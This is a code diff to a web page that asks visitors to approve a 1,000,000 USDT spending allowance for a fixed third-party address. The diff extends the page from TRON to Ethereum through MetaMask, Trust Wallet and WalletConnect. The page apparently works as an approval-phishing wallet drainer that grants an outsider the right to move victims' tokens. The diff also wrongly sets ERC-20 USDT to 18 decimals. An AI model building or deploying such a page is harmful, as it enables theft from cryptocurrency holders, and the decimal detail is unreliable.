@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Approve 1,000,000 USDT on TRON</title>
+  <title>Approve 1,000,000 USDT</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
   <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.3/dist/TronWeb.min.js" defer></script>
   <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
@@ -115,17 +115,20 @@
 </head>
 <body>
   <div class="container">
-    <h2>Approve 1,000,000 USDT on TRON</h2>
-    <p>Click the button to authorize the address:<br><strong class="spender-address">TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu</strong></p>
-    <button onclick="approveUSDT('tronlink')">Authorize with TronLink</button>
-    <button onclick="approveUSDT('trustwallet')">Authorize with Trust Wallet</button>
+    <h2>Approve 1,000,000 USDT</h2>
+    <p>Click the button to authorize the address:<br><strong class="spender-address">0x123... (Ethereum) or TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu (TRON)</strong></p>
+    <button onclick="approveUSDT('metamask')">Authorize with MetaMask (ETH)</button>
+    <button onclick="approveUSDT('trustwallet')">Authorize with Trust Wallet (ETH)</button>
+    <button onclick="approveUSDT('tronlink')">Authorize with TronLink (TRON)</button>
     <div id="loading">Processing Transaction...</div>
     <p class="status" id="statusText"></p>
   </div>
 
   <script>
-    const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC-20
-    const spenderAddress = "TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu";
+    const ethUsdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT ERC-20
+    const tronUsdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC-20
+    const ethSpenderAddress = "0x1234567890abcdef1234567890abcdef12345678"; // REPLACE with actual Ethereum address
+    const tronSpenderAddress = "TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu";
     const usdtABI = [
       {
         constant: false,
@@ -162,64 +165,78 @@
       return true;
     }
 
-    async function setupTronNetwork() {
+    async function setupEthereumNetwork() {
       if (window.ethereum) {
         try {
           await window.ethereum.request({
-            method: "wallet_addEthereumChain",
-            params: [
-              {
-                chainId: "0x2b6653dc", // TRON Mainnet
-                chainName: "TRON Mainnet",
-                nativeCurrency: { name: "TRON", symbol: "TRX", decimals: 6 },
-                rpcUrls: ["https://api.trongrid.io"],
-                blockExplorerUrls: ["https://tronscan.org"]
-              }
-            ]
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x1" }] // Ethereum Mainnet
           });
           return true;
         } catch (error) {
-          console.warn("Failed to add TRON network:", error);
+          if (error.code === 4902) {
+            try {
+              await window.ethereum.request({
+                method: "wallet_addEthereumChain",
+                params: [
+                  {
+                    chainId: "0x1",
+                    chainName: "Ethereum Mainnet",
+                    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+                    rpcUrls: ["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
+                    blockExplorerUrls: ["https://etherscan.io"]
+                  }
+                ]
+              });
+              return true;
+            } catch (addError) {
+              console.warn("Failed to add Ethereum network:", addError);
+              return false;
+            }
+          }
+          console.warn("Failed to switch to Ethereum network:", error);
           return false;
         }
       }
       return false;
     }
 
-    async function connectTrustWallet() {
+    async function connectWallet(walletType) {
       try {
         let provider;
-        if (window.ethereum && (window.ethereum.isTrust || window.ethereum.isMetaMask)) {
-          provider = new ethers.providers.Web3Provider(window.ethereum);
-          await window.ethereum.request({ method: "eth_requestAccounts" });
-          const networkAdded = await setupTronNetwork();
-          if (!networkAdded) {
-            throw new Error("Please add TRON Mainnet in Trust Wallet manually.");
-          }
-        } else {
-          provider = await EthereumProvider.init({
-            projectId: "f6b400b4393b83bb22abcaf805ad72d2", // Replace with your WalletConnect project ID
-            chains: [728126428], // TRON Mainnet chain ID
-            optionalChains: [728126428],
-            rpcMap: { 728126428: "https://api.trongrid.io" },
-            metadata: {
-              name: "USDT Approval",
-              description: "Approve USDT on TRON",
-              url: window.location.href,
-              icons: ["https://trustwallet.com/assets/images/favicon.png"]
-            },
-            showQrModal: true
-          });
-          await provider.connect();
-          provider = new ethers.providers.Web3Provider(provider);
-          const networkAdded = await setupTronNetwork();
-          if (!networkAdded) {
-            throw new Error("Please add TRON Mainnet in Trust Wallet manually via WalletConnect.");
+        if (walletType === "metamask" || walletType === "trustwallet") {
+          if (window.ethereum && (window.ethereum.isMetaMask || window.ethereum.isTrust)) {
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            await window.ethereum.request({ method: "eth_requestAccounts" });
+            const networkAdded = await setupEthereumNetwork();
+            if (!networkAdded) {
+              throw new Error(`Please switch to Ethereum Mainnet in ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"}.`);
+            }
+          } else {
+            provider = await EthereumProvider.init({
+              projectId: "f6b400b4393b83bb22abcaf805ad72d2", // Replace with your WalletConnect project ID
+              chains: [1], // Ethereum Mainnet chain ID
+              optionalChains: [1],
+              rpcMap: { 1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161" },
+              metadata: {
+                name: "USDT Approval",
+                description: "Approve USDT on Ethereum",
+                url: window.location.href,
+                icons: ["https://metamask.io/favicon.ico"]
+              },
+              showQrModal: true
+            });
+            await provider.connect();
+            provider = new ethers.providers.Web3Provider(provider);
+            const networkAdded = await setupEthereumNetwork();
+            if (!networkAdded) {
+              throw new Error(`Please add Ethereum Mainnet in ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"} via WalletConnect.`);
+            }
           }
         }
         return provider;
       } catch (error) {
-        throw new Error(`Failed to connect Trust Wallet: ${error.message}`);
+        throw new Error(`Failed to connect ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"}: ${error.message}`);
       }
     }
 
@@ -231,18 +248,18 @@
         loadingDiv.style.display = "block";
         statusText.textContent = "";
 
-        // Set approval amount: 1,000,000 USDT (6 decimals)
+        // Set approval amount: 1,000,000 USDT
         let amount;
         const ethersReady = await waitForEthers();
         if (ethersReady) {
-          amount = ethers.utils.parseUnits("1000000", 6).toString();
+          amount = ethers.utils.parseUnits("1000000", walletType === "tronlink" ? 6 : 18).toString();
         } else {
-          amount = "1000000000000"; // 1,000,000 * 10^6
+          amount = walletType === "tronlink" ? "1000000000000" : "1000000000000000000000000"; // 1M * 10^6 (TRC-20) or 1M * 10^18 (ERC-20)
           console.warn("ethers.js not loaded, using fallback amount.");
         }
 
         if (walletType === "tronlink") {
-          // TronLink approval
+          // TronLink approval (TRC-20)
           const tronWebReady = await waitForTronWeb();
           if (!tronWebReady || !window.tronWeb.defaultAddress.base58) {
             statusText.textContent = "Please install TronLink and log in to your wallet.";
@@ -256,49 +273,49 @@
             return;
           }
 
-          if (!window.tronWeb.isAddress(spenderAddress)) {
-            statusText.textContent = "Invalid spender address!";
+          if (!window.tronWeb.isAddress(tronSpenderAddress)) {
+            statusText.textContent = "Invalid TRON spender address!";
             loadingDiv.style.display = "none";
             return;
           }
 
-          const contract = await window.tronWeb.contract(usdtABI, usdtContractAddress);
+          const contract = await window.tronWeb.contract(usdtABI, tronUsdtContractAddress);
 
-          if (!confirm(`Are you sure you want to approve 1,000,000 USDT for the address: ${spenderAddress}?`)) {
+          if (!confirm(`Are you sure you want to approve 1,000,000 USDT (TRC-20) for the address: ${tronSpenderAddress}?`)) {
             statusText.textContent = "Approval cancelled.";
             loadingDiv.style.display = "none";
             return;
           }
 
           statusText.textContent = "Sending approval transaction with TronLink...";
-          const tx = await contract.approve(spenderAddress, amount).send({
+          const tx = await contract.approve(tronSpenderAddress, amount).send({
             feeLimit: 30000000, // 30 TRX
             callValue: 0,
             shouldPollResponse: false
           });
 
           statusText.textContent = `✅ Approval successful! Transaction ID: ${tx}`;
-        } else if (walletType === "trustwallet") {
-          // Trust Wallet approval
-          const provider = await connectTrustWallet();
+        } else if (walletType === "metamask" || walletType === "trustwallet") {
+          // MetaMask or Trust Wallet approval (ERC-20)
+          const provider = await connectWallet(walletType);
           const signer = provider.getSigner();
 
-          if (!ethers.utils.isAddress(spenderAddress)) {
-            statusText.textContent = "Invalid spender address!";
+          if (!ethers.utils.isAddress(ethSpenderAddress)) {
+            statusText.textContent = "Invalid Ethereum spender address!";
             loadingDiv.style.display = "none";
             return;
           }
 
-          const contract = new ethers.Contract(usdtContractAddress, usdtABI, signer);
+          const contract = new ethers.Contract(ethUsdtContractAddress, usdtABI, signer);
 
-          if (!confirm(`Are you sure you want to approve 1,000,000 USDT for the address: ${spenderAddress}?`)) {
+          if (!confirm(`Are you sure you want to approve 1,000,000 USDT (ERC-20) for the address: ${ethSpenderAddress}?`)) {
             statusText.textContent = "Approval cancelled.";
             loadingDiv.style.display = "none";
             return;
           }
 
-          statusText.textContent = "Sending approval transaction with Trust Wallet...";
-          const tx = await contract.approve(spenderAddress, amount, { gasLimit: 150000 });
+          statusText.textContent = `Sending approval transaction with ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"}...`;
+          const tx = await contract.approve(ethSpenderAddress, amount, { gasLimit: 150000 });
           const receipt = await tx.wait();
 
           statusText.textContent = `✅ Approval successful! Transaction Hash: ${receipt.transactionHash}`;
